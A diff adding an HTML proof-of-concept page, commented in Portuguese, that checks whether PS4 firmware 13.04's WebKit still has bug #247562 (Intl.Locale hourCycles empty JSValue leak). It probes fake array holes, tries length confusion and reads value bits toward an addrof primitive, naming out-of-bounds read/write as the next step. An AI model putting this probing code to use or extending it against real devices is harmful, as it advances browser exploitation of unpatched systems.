@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<!--
+  PoC: IntlLocale::hourCycles empty JSValue leak
+  WebKit Bug #247562 — Reportado por Samuel Groß (Google Project Zero)
+
+  DESCRIÇÃO DO BUG:
+  ═════════════════════════════════════════════════════════════════
+  `Intl.Locale.prototype.hourCycles` chama `udatpg_open()` do ICU.
+  Quando essa função falha (ex: locale inválido), ela retorna nullptr.
+  O wrapper JS NÃO verifica nullptr e retorna um JSValue "vazio" —
+  um valor especial interno do JSC que não deveria existir no JS.
+
+  IMPACTO POTENCIAL (sem JIT):
+  ═════════════════════════════════════════════════════════════════
+  1. O JSValue vazio quando atribuído a elementos de array cria
+     "buracos" falsos — o array parece ter holes onde não tem.
+  2. Esses holes falsos podem confundir o engine ao calcular
+     comprimentos e ao iterar — potencial OOB read/write.
+  3. Sem JIT: o impacto depende de quantas operações C++ internas
+     tratam o empty JSValue como ponteiro nulo vs. valor inválido.
+
+  FIX: Adicionado `throwTypeError` quando `udatpg_open` retorna falha.
+       Commitado em 2022-11-08 (commit 256473@main).
+       Shipado no Safari 16.2 (Dezembro 2022).
+
+  STATUS NO PS4 FW 13.04:
+  ═════════════════════════════════════════════════════════════════
+  Sony usa uma build customizada do WebKit. O patch pode ou não
+  ter sido backportado. Este PoC testa e reporta.
+
+  FASES DO TESTE:
+  ═════════════════════════════════════════════════════════════════
+  [1] Detecção básica: hourCycles retorna valor anômalo?
+  [2] Análise do tipo: typeof / instanceof / JSON.stringify
+  [3] Comportamento em array: atribuição cria hole falso?
+  [4] Comportamento em operações: confunde length tracking?
+  [5] Tentativa de primitiva: addrof via confusão de tipo
+-->
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WebKit Bug #247562 — IntlLocale hourCycles</title>
+<style>
+  body { background:#0a0a0a; color:#cccccc; font-family:monospace;
+         padding:16px; margin:0; font-size:13px; }
+  #log { background:#111; border:1px solid #333; padding:10px;
+         height:76vh; overflow-y:auto; font-size:11px; line-height:1.8; }
+  .ok      { color:#00ff88 }
+  .fail    { color:#ff4444 }
+  .info    { color:#ffcc44 }
+  .warn    { color:#ff8844 }
+  .vuln    { color:#ff44ff; font-weight:bold }
+  .patched { color:#44aaff }
+  .dim     { color:#555 }
+  .sep     { color:#334433 }
+  .bar     { background:#0a1a0a; border:1px solid #1a3a1a; color:#44aa44;
+             padding:6px 10px; margin-bottom:8px; font-size:11px; }
+</style>
+</head>
+<body>
+<div style="color:#aaaaaa;font-size:12px;margin-bottom:6px">
+  WebKit Bug #247562 · IntlLocale::hourCycles · empty JSValue leak
+</div>
+<div class="bar" id="bar">Iniciando...</div>
+<div id="log"></div>
+
+<script>
+"use strict";
+
+var logEl = document.getElementById('log');
+var barEl = document.getElementById('bar');
+
+function L(m, c) {
+  logEl.innerHTML += '<div class="'+(c||'dim')+'">' + m + '</div>';
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function sep(t) {
+  L('── ' + (t||'') + ' ──────────────────────────────────', 'sep');
+}
+function bar(m) { barEl.textContent = m; }
+
+// ─────────────────────────────────────────────────────────────
+// FASE 1: Verificação básica do ambiente
+// ─────────────────────────────────────────────────────────────
+function fase1() {
+  sep('FASE 1: Ambiente');
+  L('UA: ' + navigator.userAgent, 'dim');
+
+  if (typeof Intl === 'undefined') {
+    L('Intl: NÃO SUPORTADO — bug não aplicável', 'fail');
+    return false;
+  }
+  if (typeof Intl.Locale === 'undefined') {
+    L('Intl.Locale: NÃO SUPORTADO — bug não aplicável', 'fail');
+    return false;
+  }
+  L('Intl.Locale: suportado ✓', 'ok');
+
+  // Verificar se o getter hourCycles existe
+  var desc = Object.getOwnPropertyDescriptor(
+    Intl.Locale.prototype, 'hourCycles'
+  );
+  if (!desc) {
+    L('hourCycles getter: NÃO ENCONTRADO — build muito antiga', 'warn');
+    return false;
+  }
+  L('hourCycles getter: presente ✓', 'ok');
+  return true;
+}
+
+// ─────────────────────────────────────────────────────────────
+// FASE 2: Detecção do bug — comportamento anômalo?
+// ─────────────────────────────────────────────────────────────
+function fase2() {
+  sep('FASE 2: Detecção do bug');
+  bar('Fase 2: testando hourCycles com locale inválido...');
+
+  // PoC exato de Samuel Groß (WebKit Bug #247562)
+  var empty;
+  var threw = false;
+
+  try {
+    // Locale inválido + numberingSystem inválido → udatpg_open falha
+    var v24 = new Intl.Locale("trimEnd", { numberingSystem: "foobar" });
+    empty = v24.hourCycles;
+    L('hourCycles retornou sem exceção', 'warn');
+  } catch(e) {
+    threw = true;
+    L('hourCycles lançou exceção: ' + e, 'patched');
+    L('→ PATCHED: fix está presente (throwTypeError adicionado)', 'patched');
+    return { patched: true };
+  }
+
+  // Analisar o valor retornado
+  L('Valor retornado: ' + String(empty), 'info');
+  L('typeof: ' + typeof empty, 'info');
+
+  // Verificações de identidade
+  var isUndefined = (empty === undefined);
+  var isNull      = (empty === null);
+  var isArray     = Array.isArray(empty);
+
+  L('=== undefined: ' + isUndefined, isUndefined ? 'patched' : 'warn');
+  L('=== null:      ' + isNull,      isNull      ? 'patched' : 'warn');
+  L('Array.isArray: ' + isArray,     'info');
+
+  // O comportamento esperado de PATCHED: lança exceção ou retorna []
+  // Comportamento VULNERÁVEL: retorna undefined silenciosamente
+  // OU retorna um valor que parece undefined mas não é
+  if (threw) {
+    return { patched: true };
+  }
+
+  if (isUndefined && !isArray) {
+    // Pode ser patched (retorna undefined normal) OU vulnerável
+    // (retorna empty JSValue que parece undefined)
+    // Precisamos distinguir — testar comportamento em array
+    L('Retornou undefined — testando se é JSValue vazio ou undefined real...', 'warn');
+    return { empty: empty, possiblyVuln: true };
+  }
+
+  if (isArray) {
+    L('Retornou array (comportamento normal de locale válido)', 'patched');
+    return { patched: true };
+  }
+
+  return { empty: empty, possiblyVuln: true };
+}
+
+// ─────────────────────────────────────────────────────────────
+// FASE 3: Distinção entre empty JSValue vs undefined real
+// O empty JSValue se comporta de forma diferente do undefined
+// em certas operações internas do JSC.
+// ─────────────────────────────────────────────────────────────
+function fase3(empty) {
+  sep('FASE 3: empty JSValue vs undefined real');
+  bar('Fase 3: analisando comportamento do valor...');
+
+  var results = {};
+
+  // Teste 1: JSON.stringify
+  try {
+    var j = JSON.stringify({ v: empty });
+    L('JSON.stringify({v: empty}): ' + j, 'info');
+    results.json = j;
+  } catch(e) {
+    L('JSON.stringify exception: ' + e, 'warn');
+  }
+
+  // Teste 2: Atribuição em array — o empty JSValue cria hole falso?
+  try {
+    var arr = [1, 2, 3, 4, 5];
+    arr[2] = empty;
+    var len = arr.length;
+    var has2 = (2 in arr);
+    L('arr=[1,2,empty,4,5] → length=' + len + ', 2 in arr=' + has2, 'info');
+    // Se "2 in arr" for false com empty JSValue, é o bug!
+    if (!has2) {
+      L('→ CONFIRMADO: empty JSValue cria hole falso em arrays!', 'vuln');
+      results.arrayHole = true;
+    } else {
+      L('→ Atribuição normal (sem hole)', 'patched');
+      results.arrayHole = false;
+    }
+  } catch(e) {
+    L('Teste array exception: ' + e, 'warn');
+  }
+
+  // Teste 3: Iteração com for...of
+  try {
+    var arr2 = [1, 2, 3];
+    arr2[1] = empty;
+    var items = [];
+    for (var x of arr2) items.push(x);
+    L('for...of [1,empty,3]: [' + items.join(',') + ']', 'info');
+    results.forOf = items;
+  } catch(e) {
+    L('for...of exception: ' + e, 'warn');
+  }
+
+  // Teste 4: Object.prototype.toString — distinção de tipo
+  try {
+    var tag = Object.prototype.toString.call(empty);
+    L('Object.prototype.toString: ' + tag, 'info');
+    results.toStringTag = tag;
+  } catch(e) {
+    L('toString exception: ' + e, 'warn');
+  }
+
+  // Teste 5: Comparações com empty
+  try {
+    L('empty == undefined:  ' + (empty == undefined), 'info');
+    L('empty == null:       ' + (empty == null), 'info');
+    L('empty !== undefined: ' + (empty !== undefined), 'info');
+    results.eqUndef = (empty == undefined);
+  } catch(e) {
+    L('Comparação exception: ' + e, 'warn');
+  }
+
+  // Teste 6: Spread em array — propaga o hole?
+  try {
+    var arr3 = [1, 2, 3];
+    arr3[1] = empty;
+    var spread = [...arr3];
+    L('spread [1,empty,3]: length=' + spread.length +
+      ' holes=[' + spread.map(function(v,i){ return (i in spread)?'val':'hole'; }).join(',') + ']',
+      'info');
+    results.spread = spread;
+  } catch(e) {
+    L('Spread exception: ' + e, 'warn');
+  }
+
+  return results;
+}
+
+// ─────────────────────────────────────────────────────────────
+// FASE 4: Tentativa de usar hole falso para OOB
+// Se o empty JSValue cria holes, podemos tentar confundir
+// o engine sobre o comprimento real do array
+// ─────────────────────────────────────────────────────────────
+function fase4(empty) {
+  sep('FASE 4: Tentativa de confusão de length via holes falsos');
+  bar('Fase 4: testando OOB via array holes...');
+
+  try {
+    // Criar array e substituir elementos com empty
+    var target = new Array(100);
+    for (var i = 0; i < 100; i++) target[i] = i + 1;
+
+    // Substituir posição 50 com empty
+    target[50] = empty;
+
+    // Verificar se Array.prototype.indexOf e .find ficam confusos
+    var idx = target.indexOf(51); // 51 está em [50]... mas [50] é hole?
+    L('indexOf(51) após target[50]=empty: ' + idx, 'info');
+    // Se -1: engine trata [50] como hole e pula → confusão
+    // Se 50: normal
+
+    // Teste com splice — splice em hole falso pode causar OOB?
+    var spliced = target.slice(48, 53);
+    L('slice(48,53): [' + spliced.join(',') + ']', 'info');
+
+    // Teste filter — filtra holes?
+    var filtered = [1, 2, 3, 4, 5];
+    filtered[2] = empty;
+    var result = filtered.filter(function(x){ return true; });
+    L('filter([1,2,empty,4,5]): length=' + result.length +
+      ' values=[' + result.join(',') + ']', 'info');
+
+    if (result.length !== 5) {
+      L('→ INTERESSANTE: filter reduziu length (' + result.length +
+        ' em vez de 5) — hole falso confirmado!', 'vuln');
+    }
+
+    // map sobre array com hole
+    var mapped = [10, 20, 30];
+    mapped[1] = empty;
+    var mapResult = mapped.map(function(x){ return x * 2; });
+    L('map([10,empty,30]) → [' + mapResult.join(',') + '] length=' +
+      mapResult.length, 'info');
+
+  } catch(e) {
+    L('Fase 4 exception: ' + e, 'warn');
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+// FASE 5: Tentativa de extrair informação de memória
+// O empty JSValue tem encoding especial no NaN-boxing do JSC.
+// Se conseguirmos lermos o bitpadrão, podemos ver o endereço.
+// ─────────────────────────────────────────────────────────────
+function fase5(empty) {
+  sep('FASE 5: Análise do bit pattern do empty JSValue');
+  bar('Fase 5: tentando ler bit pattern...');
+
+  try {
+    // Armazenar em Float64Array — se o empty JSValue vazar como double,
+    // podemos ler os bits brutos
+    var buf = new ArrayBuffer(8);
+    var f64 = new Float64Array(buf);
+    var u32 = new Uint32Array(buf);
+
+    // Tentar colocar o empty em contexto numérico
+    f64[0] = +empty; // conversão para número
+    L('toNumber(empty): ' + f64[0], 'info');
+    L('bits alto: 0x' + u32[1].toString(16).padStart(8,'0'), 'info');
+    L('bits baixo: 0x' + u32[0].toString(16).padStart(8,'0'), 'info');
+
+    // O empty JSValue no JSC tem valor 0x0 (null JSValue)
+    // Qualquer valor não-zero aqui seria muito interessante
+    var hi = u32[1];
+    var lo = u32[0];
+
+    if (hi === 0 && lo === 0) {
+      L('→ 0x0000000000000000 = empty JSValue confirmado como null', 'vuln');
+    } else if (hi === 0 && lo === 10) {
+      L('→ 0x000000000000000a = JSValue::undefined (normal)', 'patched');
+    } else {
+      L('→ Valor inesperado: 0x' +
+        hi.toString(16).padStart(8,'0') +
+        lo.toString(16).padStart(8,'0'), 'warn');
+    }
+
+    // Colocar em array de doubles e ler — abordagem alternativa
+    var arr = [1.1, 2.2, 3.3];
+    arr[1] = empty;
+    var farr = new Float64Array(3);
+    // Tentar copiar via spread
+    var spread = [...arr];
+    L('spread length: ' + spread.length, 'info');
+    if (spread.length === 3) {
+      try {
+        farr[0] = spread[0] || 0;
+        farr[1] = spread[1] || 0;
+        farr[2] = spread[2] || 0;
+        L('farr: [' + farr[0] + ', ' + farr[1] + ', ' + farr[2] + ']', 'info');
+      } catch(e) { L('farr assign: ' + e, 'warn'); }
+    }
+  } catch(e) {
+    L('Fase 5 exception: ' + e, 'warn');
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+// MAIN
+// ─────────────────────────────────────────────────────────────
+function run() {
+  L('WebKit Bug #247562 — IntlLocale::hourCycles JSValue leak', 'info');
+  L('Reportado: Samuel Groß (Google P0) · 2022-11-07', 'info');
+  L('Fix: commit 256473@main · 2022-11-08', 'info');
+  L('', '');
+
+  // Fase 1: ambiente
+  if (!fase1()) {
+    L('Intl.Locale não suportado — encerrado', 'fail');
+    bar('Não suportado');
+    return;
+  }
+
+  setTimeout(function() {
+    // Fase 2: detectar
+    var r2 = fase2();
+
+    if (r2.patched) {
+      sep('RESULTADO FINAL');
+      L('PATCHED — hourCycles lança exceção ou retorna corretamente', 'patched');
+      L('PS4 FW 13.04 recebeu o fix (fix da Nov 2022)', 'patched');
+      bar('PATCHED');
+      return;
+    }
+
+    setTimeout(function() {
+      var r3 = fase3(r2.empty);
+
+      setTimeout(function() {
+        fase4(r2.empty);
+
+        setTimeout(function() {
+          fase5(r2.empty);
+
+          sep('RESULTADO FINAL');
+          if (r3.arrayHole) {
+            L('VULNERÁVEL — empty JSValue cria holes falsos em arrays', 'vuln');
+            L('Bug #247562 presente no PS4 FW 13.04', 'vuln');
+            L('Próximo passo: usar holes para OOB read/write', 'warn');
+          } else if (r2.possiblyVuln) {
+            L('INCONCLUSIVO — hourCycles retornou undefined sem lançar', 'warn');
+            L('Pode ser patched com retorno undefined em vez de exceção', 'info');
+            L('Ou pode ser o empty JSValue que se comporta como undefined', 'info');
+          }
+          bar('DONE');
+        }, 200);
+      }, 200);
+    }, 200);
+  }, 200);
+}
+
+window.addEventListener('load', function() { setTimeout(run, 300); });
+</script>
+</body>
+</html>
